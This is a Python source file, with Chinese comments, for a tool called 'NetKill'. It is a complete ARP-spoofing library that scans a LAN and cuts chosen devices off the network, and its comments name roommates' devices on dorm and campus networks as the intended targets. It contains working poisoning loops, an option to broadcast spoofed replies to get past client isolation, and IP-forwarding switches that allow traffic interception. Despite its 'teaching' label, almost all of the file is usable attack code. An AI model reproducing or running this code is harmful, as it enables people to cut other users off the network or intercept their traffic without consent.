# -*- coding: utf-8 -*-
"""
NetKill core —— ARP 局域网断网核心库（教学/实验用途）

功能：
  * 自动探测默认网关、本机网卡、室友目标机 MAC
  * ARP 双向毒化：目标 <-> 网关 的 ARP 表都被改写，目标流量被打断
  * 自动开启/关闭 IP 转发（可选，默认强制断网，不转发）
  * 退出时自动回毒（恢复目标与网关的真实 ARP 映射）
  * 多目标同时断网、定时自动停、白名单保护

依赖：scapy + Npcap(Windows) + 管理员权限
"""
from __future__ import annotations

import ctypes
import ipaddress
import os
import random
import socket
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

from scapy.all import (  # type: ignore
    ARP,
    Ether,
    IP,
    TCP,
    UDP,
    ICMP,
    conf,
    get_if_hwaddr,
    get_if_list,
    getmacbyip,
    send,
    sendp,
    sniff,
    srp1,
    srp,
)

__all__ = [
    "Adapter",
    "Device",
    "ArpKiller",
    "NetError",
    "require_admin",
    "is_admin",
    "npcap_allows_user",
    "can_send_packets",
    "list_adapters",
    "get_default_gateway",
    "enable_ip_forward",
    "disable_ip_forward",
]

WINDOWS = os.name == "nt"
IS_ADMIN: Optional[bool] = None


class NetError(RuntimeError):
    """网络/权限类错误，统一抛给 UI 层展示。"""


# --------------------------------------------------------------------------- #
# 权限与网卡
# --------------------------------------------------------------------------- #
def is_admin() -> bool:
    """是否具备管理员/root 权限（发包必需）。"""
    global IS_ADMIN
    if IS_ADMIN is not None:
        return IS_ADMIN
    try:
        if WINDOWS:
            IS_ADMIN = bool(ctypes.windll.shell32.IsUserAnAdmin())
        else:
            IS_ADMIN = os.geteuid() == 0
    except Exception:
        IS_ADMIN = False
    return IS_ADMIN


def npcap_allows_user() -> bool:
    """Npcap 是否允许非管理员发包（AdminOnly=0）。

    校园网/宿舍机器常常不是管理员权限，而 Npcap 默认安装就是 AdminOnly=0，
    此时 scapy 依然能真实发包，不需要 UAC。
    """
    if not WINDOWS:
        return False
    try:
        import winreg

        for path in (
            r"SOFTWARE\WOW6432Node\Npcap",
            r"SOFTWARE\Npcap",
        ):
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                val, _ = winreg.QueryValueEx(key, "AdminOnly")
                return int(val) == 0
            except OSError:
                continue
    except Exception:
        pass
    return False


def can_send_packets() -> bool:
    """当前身份能否发包：管理员，或 Npcap 允许普通用户。"""
    return is_admin() or npcap_allows_user()


def require_admin() -> None:
    """校园网适配：Npcap 允许普通用户时不强制管理员。"""
    if not can_send_packets():
        if WINDOWS:
            raise NetError(
                "需要管理员权限（Npcap 当前限制为仅管理员可用）。"
                "请右键『以管理员身份运行』本工具，"
                "或重装 Npcap 时不要勾选限制管理员的选项。"
            )
        raise NetError("需要 root 权限：请用 sudo 启动本工具。")


@dataclass
class Adapter:
    """一块可用的物理网卡。"""

    name: str          # 友好名，如 "WLAN" / "以太网"
    device: str        # scapy/Npcap 设备标识，如 \Device\NPF_{GUID}
    ip: str            # 本机 IPv4
    mac: str           # 本机 MAC
    gateway: Optional[str] = None

    def __str__(self) -> str:
        gw = self.gateway or "无网关"
        return f"{self.name}  [{self.ip}  {self.mac}]  gw={gw}"


def _ps(cmd: str, timeout: float = 8) -> str:
    """静默执行 PowerShell 并返回 stdout。

    注意：GUI 使用 pythonw（无控制台）启动，必须 DEVNULL + CREATE_NO_WINDOW，
    否则子进程会挂起并阻塞 Tk 主线程——这是"点扫描没反应"的根因。
    """
    try:
        flags = 0x08000000 if WINDOWS else 0  # CREATE_NO_WINDOW
        out = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=timeout,
            creationflags=flags,
        )
        return (out.stdout or "").strip()
    except Exception:
        return ""


def _norm_mac(mac: str) -> str:
    m = (mac or "").replace("-", ":").replace(".", "").lower()
    if len(m) == 12 and ":" not in m:
        m = ":".join(m[i : i + 2] for i in range(0, 12, 2))
    return m


def _read_adapters_from_scapy() -> List[Adapter]:
    """纯 scapy 读取网卡（无子进程、毫秒级，pythonw 下同样可靠）。"""
    result: List[Adapter] = []
    try:
        dev_key, _ip, gw = conf.route.route("0.0.0.0")
    except Exception:
        dev_key, gw = None, None

    seen = set()
    for key, iface in list(conf.ifaces.items()):
        try:
            ip = getattr(iface, "ip", None) or ""
            mac = _norm_mac(getattr(iface, "mac", "") or "")
            name = getattr(iface, "name", "") or str(key)
        except Exception:
            continue
        if not ip or not mac:
            continue
        if ip.startswith("127.") or ip.startswith("169.254.") or mac == "00:00:00:00:00:00":
            continue
        if name.startswith("本地连接*"):  # Wi-Fi Direct 虚拟接口，不是真实链路
            continue
        gateway = gw if (dev_key and key == dev_key) else None
        result.append(Adapter(name=name, device=key, ip=ip, mac=mac, gateway=gateway))
        seen.add(key)

    # 默认路由网卡排最前
    result.sort(key=lambda a: (0 if a.device == dev_key else 1, a.name))
    return result


def list_adapters() -> List[Adapter]:
    """枚举有 IPv4 地址且已连接的网络适配器（优先 scapy，PowerShell 兜底）。"""
    adapters = _read_adapters_from_scapy()
    if adapters:
        return adapters

    result: List[Adapter] = []
    if WINDOWS:
        raw = _ps(
            "Get-NetIPConfiguration | Where-Object {$_.IPv4Address -and $_.NetAdapter.Status -eq 'Up'} | "
            "ForEach-Object { "
            "$a=$_.NetAdapter; $i=$_.IPv4Address.IPAddress; "
            "$g=($_.IPv4DefaultGateway.NextHop | Select-Object -First 1); "
            "\"$($a.Name)|$($a.InterfaceGuid)|$i|$($a.MacAddress)|$g\" }"
        )
        for line in raw.splitlines():
            line = line.strip()
            if not line or "|" not in line:
                continue
            parts = line.split("|")
            if len(parts) < 4:
                continue
            name, guid, ip, mac = parts[0], parts[1], parts[2], parts[3]
            gw = parts[4] if len(parts) > 4 and parts[4] else None
            if not ip:
                continue
            result.append(
                Adapter(name=name, device=rf"\Device\NPF_{guid}",
                        ip=ip, mac=_norm_mac(mac), gateway=gw)
            )
        return result

    gw = get_default_gateway()
    for name in get_if_list():
        try:
            ip = conf.route.route("0.0.0.0")[1]
            if name != conf.iface and name != "lo":
                continue
            mac = get_if_hwaddr(name)
            result.append(Adapter(name=name, device=name, ip=ip,
                                  mac=_norm_mac(mac), gateway=gw))
        except Exception:
            continue
    return result


def resolve_adapter(token: str) -> Adapter:
    """按名字/序号/IP 选择网卡。"""
    adapters = list_adapters()
    if not adapters:
        raise NetError("没有找到已连接的网卡，请确认 WLAN/以太网 已连接。")
    token = (token or "").strip()
    if not token:
        # 默认选有网关的那块
        for a in adapters:
            if a.gateway:
                return a
        return adapters[0]
    if token.isdigit():
        idx = int(token) - 1
        if 0 <= idx < len(adapters):
            return adapters[idx]
        raise NetError(f"网卡序号超出范围：{token}")
    low = token.lower()
    for a in adapters:
        if low == a.name.lower() or low == a.ip or low in a.name.lower():
            return a
    raise NetError(
        "未找到网卡：%s\n可用网卡：\n  %s"
        % (token, "\n  ".join(f"{i+1}. {a}" for i, a in enumerate(adapters)))
    )


def get_default_gateway() -> Optional[str]:
    """跨平台拿默认网关 IPv4（优先 scapy 路由表，避免子进程）。"""
    try:
        _dev, _ip, gw = conf.route.route("0.0.0.0")
        if gw and gw != "0.0.0.0":
            return gw
    except Exception:
        pass
    if WINDOWS:
        out = _ps(
            "Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway} | "
            "Select-Object -First 1 -ExpandProperty IPv4DefaultGateway | "
            "Select-Object -First 1 -ExpandProperty NextHop",
            timeout=3,
        )
        for line in out.splitlines():
            line = line.strip()
            if line:
                return line
        return None
    try:
        out = subprocess.run(
            ["sh", "-c", "ip route show default | awk '{print $3; exit}'"],
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
            timeout=3,
        ).stdout.strip()
        return out or None
    except Exception:
        return None


def _route_default_ip() -> Optional[str]:
    """通过 UDP 连接探测出口网卡 IP。"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()


# --------------------------------------------------------------------------- #
# IP 转发
# --------------------------------------------------------------------------- #
def enable_ip_forward() -> Tuple[bool, str]:
    """开启系统 IP 转发（转发模式下室友能上网但被限速/可审计）。"""
    if WINDOWS:
        out = _ps(
            "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
            "/v IPEnableRouter /t REG_DWORD /d 1 /f"
        )
        if "成功" in out or "success" in out.lower() or "已成功" in out:
            return True, "已开启 IP 转发。若要使转发真正生效，可能还需要 net start RemoteAccess。"
        return False, out or "开启 IP 转发失败（缺少管理员权限？）"
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            check=True, capture_output=True,
        )
        return True, "已开启 IP 转发（net.ipv4.ip_forward=1）。"
    except Exception as e:
        return False, f"开启 IP 转发失败：{e}"


def disable_ip_forward() -> Tuple[bool, str]:
    if WINDOWS:
        _ps(
            "reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
            "/v IPEnableRouter /t REG_DWORD /d 0 /f"
        )
        return True, "已关闭 IP 转发（恢复断网/默认状态）。"
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
            check=True, capture_output=True,
        )
        return True, "已关闭 IP 转发。"
    except Exception as e:
        return False, f"关闭 IP 转发失败：{e}"


# --------------------------------------------------------------------------- #
# 目标设备
# --------------------------------------------------------------------------- #
@dataclass
class Device:
    ip: str
    mac: str
    hostname: str = ""
    vendor: str = ""
    last_seen: float = 0.0
    online: bool = True

    @property
    def label(self) -> str:
        name = self.hostname or self.vendor or "未知设备"
        return f"{self.ip:<15} {self.mac}  {name}"

    def __str__(self) -> str:
        return self.label


def _hostname(ip: str, timeout: float = 0.6) -> str:
    try:
        socket.setdefaulttimeout(timeout)
        name = socket.gethostbyaddr(ip)[0]
        return name.split(".")[0]
    except Exception:
        return ""


def _vendor(mac: str) -> str:
    """极简 OUI 识别，常见手机/电脑厂商。"""
    table = {
        "00:1A:11": "Google", "3C:5A:B4": "Google", "F4:F5:D8": "Google",
        "DC:A6:32": "RaspberryPi", "B8:27:EB": "RaspberryPi",
        "AC:BC:32": "Apple", "F0:18:98": "Apple", "A4:83:E7": "Apple",
        "3C:22:FB": "Apple", "14:7D:DA": "Apple", "9C:FC:01": "Apple",
        "00:1B:44": "Apple", "F4:0F:24": "Apple",
        "D4:93:90": "Intel", "CE:12:70": "Intel", "8C:16:45": "Intel",
        "3C:7C:3F": "Xiaomi", "64:CC:2E": "Xiaomi", "50:8F:4C": "Xiaomi",
        "78:11:DC": "Xiaomi", "8C:BE:BE": "Xiaomi",
        "00:9E:C8": "Xiaomi", "F0:B4:29": "Xiaomi",
        "1C:1B:0D": "Huawei", "48:DB:50": "Huawei", "C8:94:BB": "Huawei",
        "E0:24:7F": "Huawei", "24:09:95": "Huawei",
        "64:A2:F9": "Oppo", "C0:EE:FB": "OnePlus", "94:65:2D": "OnePlus",
        "3C:A0:67": "Vivo", "F4:8C:50": "Vivo",
        "70:3A:CB": "Samsung", "E8:50:8B": "Samsung", "38:AA:3C": "Samsung",
        "B4:7C:9C": "Amazon", "74:C2:46": "Amazon",
        "00:50:56": "VMware", "08:00:27": "VirtualBox",
        "48:8F:5A": "TP-Link", "50:C7:BF": "TP-Link",
    }
    key = (mac or "")[:8].upper()
    return table.get(key, "")


# --------------------------------------------------------------------------- #
# 核心攻击器
# --------------------------------------------------------------------------- #
@dataclass
class ArpKiller:
    """ARP 双向毒化（一键让目标断网）。"""

    adapter: Adapter
    gateway: Optional[str] = None
    targets: Dict[str, str] = field(default_factory=dict)  # ip -> mac
    interval: float = 0.7          # 毒化包间隔（秒）
    forward: bool = False          # True=限速转发(不断网), False=直接断网
    spoof_gateway: bool = True     # 毒化 目标->网关（断网必需，且不影响本机）
    spoof_target: bool = False     # 毒化 网关->目标（可选；会干扰目标下行，默认关闭）
    broadcast: bool = False        # 广播毒化：可穿透仅隔离单播的客户端隔离（校园网常用）

    # 运行态
    _stop: threading.Event = field(default_factory=threading.Event, init=False)
    _lock: threading.Lock = field(default_factory=threading.Lock, init=False)
    _sent: int = field(default=0, init=False)
    _thread: Optional[threading.Thread] = field(default=None, init=False)
    gateway_mac: Optional[str] = field(default=None, init=False)
    log_lines: List[str] = field(default_factory=list, init=False)
    on_log = None  # 回调: (text) -> None

    # ---- 初始化 ---------------------------------------------------------- #
    def __post_init__(self) -> None:
        if not self.gateway:
            self.gateway = self.adapter.gateway or get_default_gateway()
        if not self.gateway:
            raise NetError("无法获取默认网关 IP，请手动用 --gateway 指定（如 192.168.1.1）。")
        try:
            ipaddress.IPv4Address(self.gateway)
            ipaddress.IPv4Network(
                f"{self.adapter.ip}/{self._prefix()}", strict=False
            )
        except Exception:
            raise NetError(f"网关/本机 IP 格式异常：{self.adapter.ip} / {self.gateway}")

    def _prefix(self) -> int:
        """从网卡 subnet 推断前缀。Windows 下用 PowerShell，其它回退 /24。"""
        if WINDOWS:
            out = _ps(
                "Get-NetIPAddress -InterfaceAlias '%s' -AddressFamily IPv4 | "
                "Select-Object -First 1 -ExpandProperty PrefixLength" % self.adapter.name
            )
            for line in out.splitlines():
                if line.strip().isdigit():
                    return int(line.strip())
        return 24

    # ---- 基础工具 -------------------------------------------------------- #
    def log(self, text: str) -> None:
        stamp = time.strftime("%H:%M:%S")
        line = f"[{stamp}] {text}"
        self.log_lines.append(line)
        del self.log_lines[:-400]
        cb = self.on_log
        if cb:
            try:
                cb(line)
            except Exception:
                pass

    def _iface(self):
        return self.adapter.device

    def _resolve(self, ip: str, timeout: float = 1.0) -> Optional[str]:
        mac = getmacbyip(ip)
        if mac:
            return _norm_mac(mac)
        try:
            ans = srp1(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=self._iface(), timeout=timeout, verbose=0,
            )
            if ans is not None:
                return _norm_mac(ans.hwsrc)
        except Exception:
            pass
        return None

    # ---- 扫描 ------------------------------------------------------------ #
    def scan_passive(self) -> List[Device]:
        """只读扫描：读取系统邻居表（ARP 缓存），不发任何包、不需要管理员。

        这是开发/演示阶段最安全的“看谁在线”方式；缺点只能看到最近通信过的设备。
        """
        devices: Dict[str, Device] = {}
        if WINDOWS:
            out = _ps(
                "Get-NetNeighbor -InterfaceAlias '%s' -AddressFamily IPv4 -ErrorAction SilentlyContinue | "
                "Where-Object {$_.State -ne 'Unreachable' -and $_.LinkLayerAddress -ne '00-00-00-00-00-00'} | "
                "ForEach-Object { \"$($_.IPAddress)|$($_.LinkLayerAddress)\" }" % self.adapter.name
            )
            for line in out.splitlines():
                line = line.strip()
                if "|" not in line:
                    continue
                ip, mac = line.split("|", 1)
                mac = _norm_mac(mac)
                if not mac or mac == "ff:ff:ff:ff:ff:ff" or mac.startswith("01:00:5e"):
                    continue
                if ip in ("255.255.255.255",) or ip.startswith("224.") or ip.startswith("239."):
                    continue
                devices[ip] = Device(ip=ip, mac=mac, vendor=_vendor(mac),
                                     last_seen=time.time())
        else:
            out = _ps("ip neigh show dev %s" % self.adapter.name)
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 5 and parts[2] == "lladdr":
                    devices[parts[0]] = Device(ip=parts[0], mac=_norm_mac(parts[4]),
                                               vendor=_vendor(parts[4]))
        self_mac = _norm_mac(self.adapter.mac)
        for d in devices.values():
            if d.ip == self.gateway:
                d.hostname = "网关/路由器"
            elif d.ip == self.adapter.ip or d.mac == self_mac:
                d.hostname = "本机"
            else:
                d.hostname = ""   # 不做在线 DNS 反查，避免 Windows 上每台卡数秒
        self.log(f"邻居表只读扫描：{len(devices)} 台（未发送任何数据包）。")
        return sorted(devices.values(), key=lambda x: ipaddress.IPv4Address(x.ip))

    def scan(self, cidr: Optional[str] = None, timeout: float = 2.0) -> List[Device]:
        """ARP 扫描整个网段，找出所有在线设备（含室友电脑/手机）。"""
        if not cidr:
            try:
                cidr = str(
                    ipaddress.IPv4Network(
                        f"{self.adapter.ip}/{self._prefix()}", strict=False
                    )
                )
            except Exception:
                cidr = f"{self.adapter.ip}/24"
        self.log(f"ARP 扫描网段 {cidr} …（约 {timeout:g}s）")
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff")
                / ARP(pdst=cidr, hwdst="ff:ff:ff:ff:ff:ff"),
                iface=self._iface(),
                timeout=timeout,
                verbose=0,
                inter=0.01,
            )
        except PermissionError as e:
            raise NetError(f"无权限发送 ARP 包（需管理员/Npcap）：{e}")
        except OSError as e:
            raise NetError(f"网卡发包失败：{e}")

        self_mac = _norm_mac(self.adapter.mac)
        devices: Dict[str, Device] = {}
        for _, r in ans:
            mac = _norm_mac(r.hwsrc)
            ip = r.psrc
            if mac == self_mac or ip == self.adapter.ip:
                continue
            devices[ip] = Device(
                ip=ip, mac=mac, vendor=_vendor(mac), last_seen=time.time()
            )

        # 补网关 MAC（有的网关不回 ARP，直接查邻居缓存）
        if self.gateway and self.gateway not in devices:
            gmac = self._resolve(self.gateway)
            if gmac:
                devices[self.gateway] = Device(
                    ip=self.gateway, mac=gmac, vendor=_vendor(gmac),
                    hostname="网关/路由器", last_seen=time.time(),
                )
        for d in devices.values():
            if d.ip == self.gateway:
                d.hostname = "网关/路由器"
            elif not d.hostname:
                d.hostname = ""   # 不阻塞式反查 DNS
        self.log(f"发现 {len(devices)} 台在线设备。")
        return sorted(devices.values(), key=lambda x: ipaddress.IPv4Address(x.ip))

    # ---- 毒化 ------------------------------------------------------------ #
    def _pkt_to_target(self, t_mac: str, t_ip: str):
        """告诉目标：网关 IP 的 MAC 是我（网关方向被劫持）。

        broadcast=True 时用广播帧：客户端隔离通常只过滤单播，
        广播 ARP 应答仍会被 AP 转发给所有客户端，从而穿透隔离。
        """
        dst = "ff:ff:ff:ff:ff:ff" if self.broadcast else t_mac
        hwdst = "ff:ff:ff:ff:ff:ff" if self.broadcast else t_mac
        return Ether(dst=dst, src=self.adapter.mac) / ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.adapter.mac,
            pdst=t_ip,
            hwdst=hwdst,
        )

    def _pkt_to_gateway(self, t_mac: str, t_ip: str):
        """告诉网关：目标的 IP 的 MAC 是我（回程方向被劫持）。"""
        return Ether(dst=self.gateway_mac, src=self.adapter.mac) / ARP(
            op=2,
            psrc=t_ip,
            hwsrc=self.adapter.mac,
            pdst=self.gateway,
            hwdst=self.gateway_mac,
        )

    def _restore_one(self, t_ip: str, t_mac: str, rounds: int = 5) -> None:
        """恢复真实映射：目标 ← 网关真实 MAC；网关 ← 目标真实 MAC。"""
        if not self.gateway_mac or not t_mac:
            return
        dst = "ff:ff:ff:ff:ff:ff" if self.broadcast else t_mac
        hwdst = "ff:ff:ff:ff:ff:ff" if self.broadcast else t_mac
        p_t = Ether(dst=dst, src=self.gateway_mac) / ARP(
            op=2, psrc=self.gateway, hwsrc=self.gateway_mac, pdst=t_ip, hwdst=hwdst
        )
        p_g = Ether(dst=self.gateway_mac, src=t_mac) / ARP(
            op=2, psrc=t_ip, hwsrc=t_mac, pdst=self.gateway, hwdst=self.gateway_mac
        )
        for _ in range(rounds):
            try:
                sendp([p_t, p_g], iface=self._iface(), verbose=0)
            except Exception:
                break
            time.sleep(0.2)

    def _loop(self) -> None:
        self.gateway_mac = self._resolve(self.gateway)
        if not self.gateway_mac:
            self.log("⚠ 拿不到网关真实 MAC，断网模式仍可生效，但可能较难自动恢复。")
        else:
            self.log(f"网关 {self.gateway} 真实 MAC = {self.gateway_mac}")

        if self.forward:
            self.log("模式：限速转发（对方仍能上网）")
        else:
            self.log("模式：强制断网（对方完全掉线）")

        self.log(f"开始投毒，间隔 {self.interval}s，目标 {len(self.targets)} 台。Ctrl+C / 点停止 = 自动恢复。")

        while not self._stop.is_set():
            batch = []
            targets = dict(self.targets)
            for t_ip, t_mac in targets.items():
                if self.spoof_gateway:
                    batch.append(self._pkt_to_target(t_mac, t_ip))
                if self.spoof_target and self.gateway_mac:
                    batch.append(self._pkt_to_gateway(t_mac, t_ip))
            if batch:
                try:
                    sendp(batch, iface=self._iface(), verbose=0)
                    with self._lock:
                        self._sent += len(batch)
                except PermissionError as e:
                    self.log(f"发包被拒（请用管理员运行）：{e}")
                    self._stop.wait(2)
                    continue
                except Exception as e:
                    self.log(f"发包异常：{e}")
            self._stop.wait(self.interval)

        self.log("停止投毒，正在恢复 ARP 表 …")
        for t_ip, t_mac in dict(self.targets).items():
            self._restore_one(t_ip, t_mac)
            self.log(f"已恢复 {t_ip}")
        if self.forward:
            disable_ip_forward()
        self.log("已收工，网络恢复正常。")

    # ---- 对外 API -------------------------------------------------------- #
    def add(self, ip: str, mac: Optional[str] = None) -> str:
        if not mac:
            mac = self._resolve(ip)
        if not mac:
            raise NetError(f"无法解析 {ip} 的 MAC 地址（设备可能已离线/不在同网段）。")
        mac = _norm_mac(mac)
        if mac in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
            raise NetError(f"{ip} 的 MAC 非法：{mac}")
        if ip == self.adapter.ip:
            raise NetError("不能把自己设为断网目标。")
        if ip == self.gateway:
            raise NetError("不能把网关设为断网目标（会把自己断网）。")
        self.targets[ip] = mac
        return mac

    def start(self, background: bool = True) -> None:
        require_admin()
        if not self.targets:
            raise NetError("没有指定目标。请先扫描并选择室友的设备。")
        self._stop.clear()
        if self.forward:
            ok, msg = enable_ip_forward()
            self.log(msg)

        def run():
            try:
                self._loop()
            except Exception as e:  # 保证 UI 不崩
                self.log(f"运行出错：{e}")

        self._thread = threading.Thread(target=run, name="arp-killer", daemon=True)
        self._thread.start()
        if not background:
            self.wait()

    def wait(self) -> None:
        if self._thread:
            while self._thread.is_alive():
                self._thread.join(0.3)

    def stop(self) -> None:
        self._stop.set()
        if self._thread and self._thread is not threading.current_thread():
            self._thread.join(3.0)

    @property
    def running(self) -> bool:
        return bool(self._thread and self._thread.is_alive() and not self._stop.is_set())

    @property
    def sent(self) -> int:
        with self._lock:
            return self._sent


# --------------------------------------------------------------------------- #
# 网关发现辅助（给 CLI 用）
# --------------------------------------------------------------------------- #
def find_gateway_mac(ip: str, iface: str) -> Optional[str]:
    mac = getmacbyip(ip)
    if mac:
        return _norm_mac(mac)
    try:
        ans = srp1(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            iface=iface, timeout=1.5, verbose=0,
        )
        return _norm_mac(ans.hwsrc) if ans is not None else None
    except Exception:
        return None
